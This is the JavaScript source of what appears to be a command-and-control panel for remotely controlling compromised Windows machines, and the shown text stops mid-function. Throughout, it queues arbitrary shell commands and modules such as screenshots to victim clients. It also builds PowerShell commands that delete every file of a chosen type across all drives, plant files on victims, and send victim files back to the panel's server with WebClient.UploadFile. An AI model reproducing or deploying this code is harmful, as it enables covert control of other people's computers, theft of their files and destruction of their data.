// start variable
var BASE_URL = "request/handler.php";
var token = $("#cstoken").val();
document.location.hash = "";
// end variable
// start function

function loadData() {
  $.post(BASE_URL, { offline: true, token: token });
  setTimeout(() => {
    $.post(BASE_URL, { data: true, token: token }, function (data) {
      $("#client_area").html("");

      var req = JSON.parse(data);

      req.forEach(function (data) {
        var ip = data[0];
         
        // $.post(`//ipapi.co/${ip}/json/`, function (ct) {
        //   console.log(ct);
        //   var ct = ct.continent_code
          var uuid = data[1];


          var OsName = data[2].OsName;
          var fconnection = data[3];
          var lconnection = data[4];
          var label = data[6];
          if (label === null || label === "") {
            var label = "<b style='color:blue;cursor: pointer;'>Set</b>";
          } else {
            var label = `<b style='color:blue;cursor: pointer;'>${label}</b>`;
          }
        
          var template = `<tr class="alert custom_alert" role="alert" uuid="${uuid}" oncontextmenu=(setuid(this))>
        <td>
            <label class="checkbox-wrap checkbox-primary" >
                <input type="checkbox"  uuid="${uuid}" onChange="multi_client(this)">
                <span class="checkmark"></span>
            </label>
        </td>
        <td class="d-flex align-items-center" style="white-space:nowrap">
            <div class="img" uuid="${uuid}" onclick="wallpaper(this)"  style="background-image: url(../users/${uuid}/wallpaper.jpg);"></div>
            <div class="pl-3 email">
                <span class="os">${OsName}</span>

                <span class="fconnection" onclick="labelModal(this)" uuid="${uuid}" id="userlabel"> ${label}</span>
                <span class="fconnection">First Connection: ${fconnection}</span>
                <span class="lconnection">Last Connection: ${lconnection}</span>
            </div>
        </td>
        <td >${ip}</td>
        <td >${uuid}</td>
        <td>${data[2].CsUserName}</td>
        <td >${data[2].CsDomain}</td>
        <td>null</td>

        <td class="status status_client" uuid="${uuid}">wait</td>
        <td class="status status_job " uuid="${uuid}">wait</td>
        <td >
            <button type="button" class="close"  onclick="delete_user(this)" uuid="${uuid}">
                <span aria-hidden="true" on><i class="fa fa-close"></i></span>
            </button>
            <button type="button" class="close" style="color:blue !important;" onclick="systemInfoModal(this)" uuid="${uuid}">
            <span aria-hidden="true" on><i class="fa fa-info-circle"></i></span>
        </button>
          
        </td>

        `;

          $("#client_area").append(template);
          var value = $("#search").val().toLowerCase();
          $("#client_area tr").filter(function () {
            $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)

          });
        });
      // })

    });
  }, 2000);

}

function multi_client(e) {
  var uuid = $(e).attr("uuid");
  if (e.checked) {
    if (`#${uuid}` == document.location.hash) {
      var tmp_hash = document.location.hash.replace(`#${uuid}`, `#${uuid}&`);
      document.location.hash = tmp_hash;
    } else {
      document.location.hash += uuid + "&";
    }
  } else {
    var tmp_hash = document.location.hash.replace(`${uuid}&`, "");
    document.location.hash = tmp_hash;
  }
}

function loadModule() {
  $(`input[module]`).each(function (i, el) {
    $(el).remove();
  });
  $.post(BASE_URL, { module_option: true, token: token }, function (data) {
    $("#module_option").html("");

    var req = JSON.parse(data);

    req.forEach(function (data) {
      input_count = data.args;
      input_module = data.name;
      var msg = data.place_holder;

      var placeholder = msg.split(",");

      if (input_count > 0) {
        for (let index = 0; index < input_count; index++) {
          var msg = placeholder[index];

          var template = `
                    <input type="text" placeholder="${msg}"  class="args" module="${input_module}">
                `;
          $("#module_input").append(template);
        }
      }
    });

    req.forEach(function (data) {
      var template = `
            <option>${data.name}</option>
            `;
      $("#module_option").append(template);
    });
  });
}
function loadVariable() {
  $(`input[variable]`).each(function (i, el) {
    $(el).remove();
  });
  $.post(BASE_URL, { variable_option: true, token: token }, function (data) {
    $("#variable_option").html("");

    var req = JSON.parse(data);

    req.forEach(function (data) {
      var template = `
            <option>${data.name}</option>
            `;
      $("#variable_option").append(template);
    });
  });
}
function setuid(e) {
  var uuid = $(e).attr("uuid");
  document.location.hash = uuid;
}
function shell_exec() {
  var uuid = window.location.href.split("#")[1];
  var cmd = $("#shell_cmd").val();
  var status = $(".active").html();
  if (status !== "UP") {
    swal({
      title: "Are you sure",
      text: "Client is Offline Or Wait For Result Do You Want Add Scheduled ?",
      icon: "warning",
      buttons: true,
      dangerMode: true,
    }).then((willDelete) => {
      if (willDelete) {
        $.post(
          BASE_URL,
          { add_command: true, command: cmd, uuid: uuid, token: token },
          function (data) {
            localStorage.setItem("cmd_uid", data.trim());
          }
        );
      }
    });
  } else {
    $.post(
      BASE_URL,
      { add_command: true, command: cmd, uuid: uuid, token: token },
      function (data) {
        localStorage.setItem("cmd_uid", data.trim());

        setTimeout(() => {
          shell_exec_res();
        }, 2500);
      }
    );
  }
}
function shell_exec_res() {
  var uuid = window.location.href.split("#")[1];
  var cmd_uid = localStorage.getItem("cmd_uid");
  
  if (cmd_uid == null) {
    $("#shell_res").html("First Send Command");
  } else {
    if($('#check_notification_status').prop('checked')){
      var notification = 1;
    }else{
      var notification = 0;

    }
    $.post(
      BASE_URL,
      { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token,notification:notification },
      function (data) {
        $("#shell_res").html(data.trim());
      }
    );
  }
}
$("#client_area").contextPopup({
  title: "Options",
  items: [
    {
      label: "SHELL",
      icon: "assets/images/icons/shell.png",
      action: function (e) {
        localStorage.removeItem("cmd_uid");
        $("#exampleModal").modal("show");
      },
    },
    // { label: 'System Information', icon: 'images/icons/receipt-text.png', action: function () { alert('clicked 2') } },
    {
      label: "Module",
      icon: "assets/images/icons/module.png",
      action: function () {
        $("#moduleModal").modal("show");
        $("#module_res").css("display", "block");
        $(".module_exec").css("display", "block");
        $(".module_exec_res").css("display", "block");
      },
    },
    {
      label: "Variable",
      icon: "assets/images/icons/variable.png",
      action: function () {
        $("#variableModal").modal("show");
      },
    },

    , {
      label: "File Manager",
      icon: "assets/images/icons/file.png",
      action: function () {
        $("#fileManagerModal").modal("show");
        // select_drive()
      },
    },
    {
      label: "History",
      icon: "assets/images/icons/history.png",
      action: function () {
        $("#historyModal").modal("show");
        history_command();
      },
    },

    // { label: 'Scheduled Task', icon: 'images/icons/application-table.png', action: function () { alert('clicked 7') } },
  ],
});
function wallpaper(e) {
  var uuid = $(e).attr("uuid");
  $(".imagepreview").attr("src", `../users/${uuid}/wallpaper.jpg`);
  $("#imagemodal").modal("show");
}
$("#module_option").on("change", function () {
  var option = this.value;
  $("input").css("display", "none");
  $(`input[module=${option}]`).each(function (i, el) {
    $(el).val("");
    $(el).css("display", "block");
  });
});
function module_create_btn() {
  var argument_data;
  var module_name = $("#module_name").val();
  var module_code = $("#module_code").val();
  var number_args = $(`input[args_option]`).length;
  $(`input[args_option]`).each(function (i, el) {
    argument_data += $(el).val() + ",";
  });
  if (argument_data) {
    var undefineds = argument_data.replace("undefined", "");
    var coma = undefineds.substring(0, undefineds.length - 1);
  } else {
    var coma = "";
  }

  $.post(
    BASE_URL,
    {
      add_module: true,
      args: number_args,
      name: module_name,
      code: module_code,
      placeholder: coma,
      token: token,
    },
    function (data) {
      data = data.trim()
      if (data == "empty_name") {
        swal({
          title: "Oops...",
          text: "Name Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "empty_code") {
        swal({
          title: "Oops...",
          text: "Code Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "exist") {
        swal({
          title: "Oops...",
          text: "Module Exist!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "ok") {
        setTimeout(function () {
          swal({
            title: "OK",
            text: "Module Added Successfuly!",
            icon: "success",
            dangerMode: true,
          });

          loadModule();
          counter = 0;
          $(`input[args_option]`).each(function (i, el) {
            $(el).remove();
          });
          $("#module_name").val("");
          $("#module_code").val("");
        }, 300);
      }
    }
  );
}
var counter = 0;
function create_args() {
  counter += 1;

  var template = `
                     <input type="text" class="args_option" placeholder="Placeholder $a${counter}" args_option="true">
    `;

  $("#args_list").append(template);
}
function create_args_edit() {
  counter += 1;

  var template = `
                     <input type="text" class="args_option" placeholder="Placeholder $a${counter}" args_option="true" >
    `;

  $("#args_list_edit").append(template);
}
function delete_args() {
  if (counter == 0) {
    counter = 1;
  }
  counter -= 1;

  var list = $(`input[args_option]`);
  list.last().remove();
}
function module_exec() {
  var module = $("#module_option").val();

  var argument_data;
  $(`input[module=${module}]`).each(function (i, el) {
    $(el).css("display", "block");
    argument_data += "^^" + $(el).val();
  });
  if (argument_data) {
    var undefineds = argument_data.replace("undefined", "");

    var args = undefineds;
  } else {
    var args = "";
  }
  var uuid = window.location.href.split("#")[1];

  var status = $(".active").html();

  if (status !== "UP") {
    swal({
      title: "Are you sure",
      text: "Client is Offline Or Wait For Result Do You Want Add Scheduled ?",
      icon: "warning",
      buttons: true,
      dangerMode: true,
    }).then((willDelete) => {
      if (willDelete) {
        $.post(
          BASE_URL,
          {
            add_command: true,
            args: args,
            command: module,
            uuid: uuid,
            token: token,
          },
          function (data) {
            if (data === "empty_uuid") {
              swal({
                title: "Oops...",
                text: "Need Select Client!",
                icon: "error",
                dangerMode: true,
              });
            }
            localStorage.setItem("cmd_uid", data.trim());
          }
        );
      }
    });
  } else {
    $.post(
      BASE_URL,
      {
        add_command: true,
        args: args,
        command: module,
        uuid: uuid,
        token: token,
      },
      function (data) {
        if (data === "empty_uuid") {
          swal({
            title: "Oops...",
            text: "Need Select Client!",
            icon: "error",
            dangerMode: true,
          });
        }
        localStorage.setItem("cmd_uid", data);
        setTimeout(() => {
          module_exec_res();
        }, 2500);
      }
    );
  }
}
function variable_exec() {
  var module = $("#variable_option").val();

  $.post(
    BASE_URL,
    { variable_exec: true, command: module, token: token },
    function (data) {
      $("#variable_res").val(data);
    }
  );
}

function module_edit() {
  var module = $("#module_option").val();
  // alert(module)

  $.post(
    BASE_URL,
    { module_edit: true, name: module, token: token },
    function (data) {
      var req = JSON.parse(data);

      req.forEach(function (data) {
        $("#args_list_edit").html("");
        counter = 0;

        var input_count = data.args;
        var input_module = data.name;
        var msg = data.place_holder;
        var code = data.code;
        var placeholder = msg.split(",");
        $("#module_name_edit").val(input_module);
        $("#module_name_old").val(input_module);
        $("#module_code_edit").val(code.trim());

        if (input_count > 0) {
          for (let index = 0; index < input_count; index++) {
            var msg = placeholder[index];

            var template = `
                    <input type="text" value="${msg}"  class="args_option" module="${input_module}" placeholder="Placeholder $a${counter}" args_option="true">
                `;
            $("#args_list_edit").append(template);
          }
          counter = input_count;
        }
      });
    }
  );
  $("#moduleEditModal").modal("show");
}
function variable_edit() {
  var module = $("#variable_option").val();
  // alert(module)

  $.post(
    BASE_URL,
    { module_edit: true, name: module, token: token },
    function (data) {
      var req = JSON.parse(data);

      req.forEach(function (data) {
        var variable_name = data.name;
        var variable_code = data.code;
        $("#variable_name_edit").val(variable_name);
        $("#variable_name_old").val(variable_name);
        $("#variable_code_edit").val(variable_code.trim());
      });
    }
  );
  $("#variableEditModal").modal("show");
}
function module_update_btn() {
  var argument_data;
  var module_name = $("#module_name_edit").val();
  var old_name = $("#module_name_old").val();
  var module_code = $("#module_code_edit").val();
  var number_args = $(`input[args_option]`).length;
  $(`input[args_option]`).each(function (i, el) {
    argument_data += $(el).val() + ",";
  });
  if (argument_data) {
    var undefineds = argument_data.replace("undefined", "");
    var coma = undefineds.substring(0, undefineds.length - 1);
  } else {
    var coma = "";
  }

  $.post(
    BASE_URL,
    {
      update_module: true,
      args: number_args,
      name: module_name,
      old_name: old_name,
      code: module_code,
      placeholder: coma,
      token: token,
    },
    function (data) {
      data = data.trim()
      if (data == "empty_name") {
        swal({
          title: "Oops...",
          text: "Name Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "empty_code") {
        swal({
          title: "Oops...",
          text: "Code Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "empty_old_name") {
        swal({
          title: "Oops...",
          text: "old name Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "exist") {
        swal({
          title: "Oops...",
          text: "Module Exist!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "ok") {
        setTimeout(function () {
          swal({
            title: "OK",
            text: "Module Update Successfuly!",
            icon: "success",
            dangerMode: true,
          });

          loadModule();
        }, 300);
      }
    }
  );
}
function module_exec_res() {
  var uuid = window.location.href.split("#")[1];
  var cmd_uid = localStorage.getItem("cmd_uid").trim();
  var module = $("#module_option").val();
  if (cmd_uid == null) {
    $("#module_res").html("First Send Command");
  } else {
    $.post(
      BASE_URL,
      { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
      function (data) {
        $("#module_res").html(data.trim());
        if (module === "ScreenShot") {
          $("#module_res").css("display", "none");
          $("#screen").attr("src", `../users/${uuid}/${data.trim()}`);
        }
      }
    );
  }
}
function module_remove() {
  var module = $("#module_option").val();

  swal({
    title: "Are you sure",
    text: `Delete Module ${module} ?`,
    icon: "warning",
    buttons: true,
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      $.post(BASE_URL, { name: module, delete_module: true, token: token });
      swal({
        title: "OK",
        text: `Module  ${module} Removed Successfuly!`,
        icon: "success",
        dangerMode: true,
      });
      setTimeout(function () {
        loadModule();
        counter = 0;
        $(`input[args_option]`).each(function (i, el) {
          $(el).remove();
        });
        $("#module_name").val("");
        $("#module_code").val("");
      }, 300);
    }
  });
}
function history_command() {
  var uuid = window.location.href.split("#")[1];
  $("#history_data").html("");
  $.post(
    BASE_URL,
    { uuid: uuid, history_command: true, token: token },
    function (data) {
      var req = JSON.parse(data);
      req.forEach(function (data) {
        if (data.status == 1) {
          var action = `     
    <span aria-hidden="true" onclick="delete_command(this)" cmd_uid='${data.cmd_uid}'><i class="fa close fa-close text-danger"></i></span>
    <span aria-hidden="true" onclick="rerun_command(this)" cmd_uid='${data.cmd_uid}'><i class="fa fa-rotate-right"></i></span>
    `;
        } else {
          var action = `       
    <span aria-hidden="true" onclick="delete_command(this)" cmd_uid='${data.cmd_uid}'><i class="fa fa-close close text-danger"></i></span>`;
        }
        var template = `  <tr class="alert" role="alert">
    <th scope="row">${data.id}</th>
    <td>${data.cmd}</td>
    <td>${data.result}</td>
    <td>${data.cmd_uid}</td>
    <td>${data.time}</td>
    <td>${data.status}</td>
    <td>
      <a href="javascript:void(0)"  aria-label="Close">
        ${action}
      </a>
    </td>
  </tr>`;
        $("#history_data").append(template);
      });
    }
  );
}

function variable_create_btn() {
  var variable_name = $("#variable_name").val();
  var variable_code = $("#variable_code").val();
  $.post(
    BASE_URL,
    {
      add_variable: true,
      name: variable_name,
      code: variable_code,
      token: token,
    },
    function (data) {
      if (data == "empty_name") {
        swal({
          title: "Oops...",
          text: "Name Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "empty_code") {
        swal({
          title: "Oops...",
          text: "Code Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "exist") {
        swal({
          title: "Oops...",
          text: "Variable Exist!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "syntax_error") {
        swal({
          title: "Oops...",
          text: "syntax_error!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "ok") {
        swal({
          title: "OK",
          text: "Variable Added Successfuly!",
          icon: "success",
          dangerMode: true,
        });
      }
      setTimeout(() => {
        loadVariable();
      }, 300);
    }
  );
}
function delete_command(e) {
  var cmd_uid = $(e).attr("cmd_uid");
  var uuid = window.location.href.split("#")[1];

  swal({
    title: "Are you sure",
    text: `Delete Command ${cmd_uid} ?`,
    icon: "warning",
    buttons: true,
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      $.post(BASE_URL, {
        cmd_uid: cmd_uid,
        uuid: uuid,
        delete_command: true,
        token: token,
      });
      $(e).parents()[2].remove();
    }
  });
}
function rerun_command(e) {
  var cmd_uid = $(e).attr("cmd_uid");
  var uuid = window.location.href.split("#")[1];

  swal({
    title: "Are you sure",
    text: `Re Run Command ${cmd_uid} ?`,
    icon: "warning",
    buttons: true,
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      $.post(BASE_URL, {
        cmd_uid: cmd_uid,
        uuid: uuid,
        rerun_command: true,
        token: token,
      });
      $("#historyModal").modal("toggle");
    }
  });
}
function variable_remove() {
  var variable_option = $("#variable_option").val();

  swal({
    title: "Are you sure",
    text: `Delete Variable ${variable_option} ?`,
    icon: "warning",
    buttons: true,
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      $.post(BASE_URL, {
        name: variable_option,
        delete_module: true,
        token: token,
      });
      setTimeout(function () {
        loadVariable();
      }, 300);
    }
  });
}
function delete_user(e) {
  var uuid = $(e).attr("uuid");
  swal({
    title: "Are you sure",
    text: `Delete User ${uuid} ?`,
    icon: "warning",
    buttons: true,
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      $.post(BASE_URL, {
        add_command: true,
        command: "Terminate",
        uuid: uuid,
        token: token,
      });
      setTimeout(() => {
        $.post(BASE_URL, { uuid: uuid, delete_user: true, token: token });
        loadData();
      }, 3000);
    }
  });
}
function variable_update_btn() {
  var variable_name = $("#variable_name_edit").val();
  var variable_old_name = $("#variable_name_old").val();
  var variable_code = $("#variable_code_edit").val();
  $.post(
    BASE_URL,
    {
      update_variable: true,
      name: variable_name,
      old_name: variable_old_name,
      code: variable_code,
      token: token,
    },
    function (data) {
      if (data == "empty_name") {
        swal({
          title: "Oops...",
          text: "Name Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "empty_code") {
        swal({
          title: "Oops...",
          text: "Code Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "empty_old_name") {
        swal({
          title: "Oops...",
          text: "old name Cant Be Empty!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "exist") {
        swal({
          title: "Oops...",
          text: "Variable Exist!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "syntax_error") {
        swal({
          title: "Oops...",
          text: "syntax_error!",
          icon: "error",
          dangerMode: true,
        });
      }
      if (data == "ok") {
        setTimeout(function () {
          swal({
            title: "OK",
            text: "Variable Update Successfuly!",
            icon: "success",
            dangerMode: true,
          });

          loadVariable();
        }, 300);
      }
    }
  );
}
function systemInfoModal(e) {
  var uuid = $(e).attr("uuid");
  $.post(
    BASE_URL,
    { system_info: true, uuid: uuid, token: token },
    function (data) {
      var data = JSON.parse(data);
      Object.keys(data).forEach((key) => {
        var template = `
            <pre>${key} : ${data[key]}</pre>
            `;
        console.log(key, data[key]);
        $("#systemInfoModalBody").append(template);
      });
    }
  );

  //
  $("#systemInfoModal ").modal("show");
}
function update_event_btn() {
  var code = $("#event_code_edit").val();
  var name = $("#event_name_edit").val();

  $.post(
    BASE_URL,
    { edit_event: true, name: name, code: code, token: token },
    function (data) {
      data = data.trim()
      if (data === "ok") {
        swal({
          title: "OK",
          text: "Event Updated Successfuly!",
          icon: "success",
          dangerMode: true,
        });
      }
    }
  );
}
function showEvent() {
  var name = $("#event_option").val();

  $.post(
    BASE_URL,
    { show_event: true, name: name, token: token },
    function (data) {
      $("#editEvent ").modal("show");
      $("#event_name_edit").val(name);

      $("#event_code_edit").val(data.trim());
    }
  );
}
function labelModal(e) {
  var uuid = $(e).attr("uuid");
  document.location.hash = uuid;
  var label = $("#userlabel").text();
  $("#label_name").val(label);
  $("#labelModal ").modal("show");
}
function set_label() {
  var uuid = window.location.href.split("#")[1];

  $.post(BASE_URL, {
    set_label: true,
    name: $("#label_name").val(),
    uuid: uuid,
    token: token,
  });
  $("#userlabel").html($("#label_name").val());
  swal({
    title: "OK",
    text: "Label Chenge Successfuly!",
    icon: "success",
    dangerMode: true,
  });
}



function get_file_list(e) {
  var uuid = window.location.href.split("#")[1];
  if (e == "ALL") {
    var command = `$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object {$_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name | ConvertTo-Json`

  }
  else {
    var command = `(Get-ChildItem  -Path ${e}:\\\ -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`

  }
  $.post(
    BASE_URL,
    { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
      localStorage.setItem("cmd_uid", data.trim());

    });

}
function get_file_list_res(e) {
  $("#file_res").html("");
  $(".file_res_table").css("display", "block")

  var uuid = window.location.href.split("#")[1];
  var cmd_uid = localStorage.getItem("cmd_uid");

  $.post(
    BASE_URL,
    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
    function (data) {
      var data = JSON.parse(data)
      data.forEach(function (data) {
        var name_format = data.Name
        var count_format = data.Count
        // console.log(name_format);
        var template = `
        <tr>
        <td class="tdf">${name_format}</td>
        <td class="tdf">${count_format}</td>
        <td class="tdf">2GB</td>
        <td class="tdf"> <a href="javascript:void(0)"  >View </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="${name_format}">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  >Download </a></td>

       
      </tr>
        `

        $("#file_res").append(template);
      });

    }
  );

}
function delete_file_format(e) {
  var file_format = $(e).attr("file_format");
  var uuid = window.location.href.split("#")[1];
  var option_drive = $("#select_drive").val()
  if (option_drive == "ALL") {
    var command = `$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *${file_format} -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).FullName | Remove-Item`
    var message = `Delete All ${file_format} Files in System ?`
  } else {
    var command = `(Get-ChildItem  -Path ${option_drive}:\\\ -Filter *${file_format} -Recurse -Attributes Archive ).FullName | Remove-Item`
    var message = `Delete All ${file_format} Files in ${option_drive} Partition ?`


  }
  swal({
    title: "Are you sure",
    text: message,
    icon: "warning",
    buttons: true,
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      $.post(
        BASE_URL,
        { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
          localStorage.setItem("cmd_uid", data.trim());

        });
    }
  });
}

function get_drive_list_res(e) {
  var uuid = window.location.href.split("#")[1];
  var cmd_uid = localStorage.getItem("cmd_uid");

  $.post(
    BASE_URL,
    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
    function (data) {
      var data = JSON.parse(data)
      data.forEach(function (data) {
        var name_format = data.Name

        var template = `
 
        <option class="drive_letter">${name_format}</option>
        `

        $("#select_drive").append(template);
      });

    }
  );
  $(".drive_option").css("display", "none")
  $("#select_drive").css("display", "block")
  $(".drive_file_option").css("display", "block")


}

function select_drive() {
  var uuid = window.location.href.split("#")[1];
  var command = `Get-PSDrive -PSProvider 'FileSystem' | select Name| ConvertTo-Json`
  $.post(
    BASE_URL,
    { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
      localStorage.setItem("cmd_uid", data.trim());

    });
}

$("#select_drive").on("change", function () {
  $(".file_res_table").css("display", "none")

  var option = this.value;
  if (option == "ALL") {
    get_file_list("ALL")
  }
  if (option != "------------" && option != "ALL") {
    get_file_list(option)
  }
});
// man
$("#search").on("keyup", function () {
  var value = $(this).val().toLowerCase();
  $("#client_area tr").filter(function () {
    $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)

  });
});

function search_dir_get() {
  var uuid = window.location.href.split("#")[1];
  if ($("#search_dir_input").val() != "") {
    var dir_path = $("#search_dir_input").val()
  } else {
    var dir_path = ""

  }
  var command = `dir "${dir_path}"  | ConvertTo-Json`
  $.post(
    BASE_URL,
    { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
      localStorage.setItem("cmd_uid", data.trim());

    });
}


function search_dir_show() {
  $("#search_dir_res").html("");
  var uuid = window.location.href.split("#")[1];
  var cmd_uid = localStorage.getItem("cmd_uid");

  $.post(
    BASE_URL,
    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
    function (data) {
      if (data.trim() == 'Client Offline Or Wait For Send Results') {
        $(".loaders").css("display", "block");

      } else {
        var Interval = localStorage.getItem("Interval");
        clearInterval(Interval)
        $(".loaders").css("display", "none");
        $(".search_dir_table").css("display", "block");
        
        var data = JSON.parse(data)
        if(data.length>1){

        data.forEach(function (data) {

       
          if (data.Length) {
            var sizeInMB = (Number(data.Length) / (1024 * 1024)).toFixed(2) + 'MB'
            var file_type = "file"
            var access_option=` <a href="javascript:void(0)"  >Run </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="dlfilem(this)" name='${data.Name}' fullname='${data.FullName}' DirectoryName='${data.DirectoryName}'>Download </a>`

          } else {
           
            var sizeInMB = "-"
            var file_type = "folder"
            var access_option=` <a href="javascript:void(0)"  name='${data.FullName}' onclick="change_path_view(this)">View </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="uploader(this)" name='${data.FullName}'>Upload </a>`

          }


          var regex = /\d+/g;
          var LastAccessTime = data.LastAccessTime.match(regex);  // creates array from matches
          var time = new Date(Number(LastAccessTime)).toLocaleString();


          var template = `
    <tr>
    <td class="tdf"><span aria-hidden="true" on="">${file_type}</td>
          <td class="tdf">${data.Name}</td>
          <td class="tdf">${time}</td>
          <td class="tdf">${sizeInMB}</td>
          <td class="tdf">${access_option}</td>
  
         
        </tr>
    `

          $("#search_dir_res").append(template);
          
        }
        
        );
      }
      else{
        if (data.Length) {
          var sizeInMB = (Number(data.Length) / (1024 * 1024)).toFixed(2) + 'MB'
          var file_type = "file"
          var access_option=` <a href="javascript:void(0)"  >Run </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="dlfilem(this)" name='${data.Name}' fullname='${data.FullName}' DirectoryName='${data.DirectoryName}'>Download </a>`

        } else {
         
          var sizeInMB = "-"
          var file_type = "folder"
          var access_option=` <a href="javascript:void(0)"  name='${data.FullName}' onclick="change_path_view(this)">View </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="uploader(this)" name='${data.Name}'>Upload </a>`

        }


        var regex = /\d+/g;
        var LastAccessTime = data.LastAccessTime.match(regex);  // creates array from matches
        var time = new Date(Number(LastAccessTime)).toLocaleString();


        var template = `
  <tr>
  <td class="tdf"><span aria-hidden="true" on="">${file_type}</td>
        <td class="tdf">${data.Name}</td>
        <td class="tdf">${time}</td>
        <td class="tdf">${sizeInMB}</td>
        <td class="tdf">${access_option}</td>

       
      </tr>
  `

        $("#search_dir_res").append(template);
        
      }
      }
    

    }
  )
}

$("#search_dir_input").on("focusout", function () {
  search_dir_get()
  var Interval=setInterval(() => {
    search_dir_show()
  }, 300);
  localStorage.setItem("Interval", Interval);
});
$("#search_dir_input").on("click", function () {
  $(".search_dir_table").css("display","none")
});


function uploader(e){
  var folder_name = $(e).attr("name");
  localStorage.setItem("folder_name", folder_name);

$("#uploader:hidden").trigger('click');
}





$('#uploader').change(function (e) {
  var file = e.target.files[0];
  var file_name = e.target.files[0].name;
  var folder_name = localStorage.getItem("folder_name");
  var uuid = window.location.href.split("#")[1];

  // alert('The file "' + fileName +  '" has been selected.');
  // alert(folder_name)


  var fd = new FormData(); 
  fd.append('file', file); 

  $.ajax({ 
      url: `${window.location.href.split('/panel')[0]}/?upload&uuid=${uuid}`, 
      type: 'post', 
      data: fd, 
      contentType: false, 
  
      processData: false, 
      success: function(response){ 
          if(response != 0){ 
             var cmd=`(New-Object System.Net.WebClient).DownloadFile("${window.location.href.split('/panel')[0]}/users/${uuid}/${file_name}", "${folder_name}/${file_name}")`
             $.post(
               BASE_URL,
               { add_command: true, command: cmd, uuid: uuid, token: token },
               function (data) {
                 localStorage.setItem("cmd_uid", data.trim());
                 var Interval=setInterval(() => {
                  get_upload_status()
                }, 1500);
                localStorage.setItem("Interval", Interval);
               }
             );
           
          } 
          else{ 
              alert('file not uploaded'); 
          } 
      }, 
  }); 

});





function download(url) {
  const a = document.createElement('a')
  a.href = url
  a.download = url.split('/').pop()
  document.body.appendChild(a)
  a.click()
  document.body.removeChild(a)
}


function change_path_view(e){
  var folder_name = $(e).attr("name");
  $("#search_dir_input").val(folder_name)
  search_dir_get()
  var Interval=setInterval(() => {
    search_dir_show()
  }, 300);
  localStorage.setItem("Interval", Interval);
}

function get_dlfilem(){

  var uuid = window.location.href.split("#")[1];
  var cmd_uid = localStorage.getItem("cmd_uid");

  $.post(
    BASE_URL,
    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
    function (data) {
      if (data.trim() == 'Client Offline Or Wait For Send Results') {
      }else{
        download(`${window.location.href.split('/panel')[0]}/users/${data.trim()}`)
        var Interval = localStorage.getItem("Interval");
        clearInterval(Interval)
      } 
    }
    );

}
function dlfilem(e){
  var uuid = window.location.href.split("#")[1];
  var file_name = $(e).attr("name");
  var full_name = $(e).attr("fullname");
  var DirectoryName = $(e).attr("DirectoryName");
  var cmd=`$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID;$file="${DirectoryName}\\${file_name}";$wc = New-Object System.Net.WebClient;$resp = $wc.UploadFile("${window.location.href.split('/panel')[0]}/?upload&uuid=$UID", $file);return "$UID/${file_name}"`

  $.post(
    BASE_URL,
    { add_command: true, command: cmd, uuid: uuid, token: token },
    function (data) {
      localStorage.setItem("cmd_uid", data.trim());
    }
  );

  var Interval=setInterval(() => {
    get_dlfilem()
  }, 1500);
  localStorage.setItem("Interval", Interval);

  
}

function get_upload_status() {
  var uuid = window.location.href.split("#")[1];
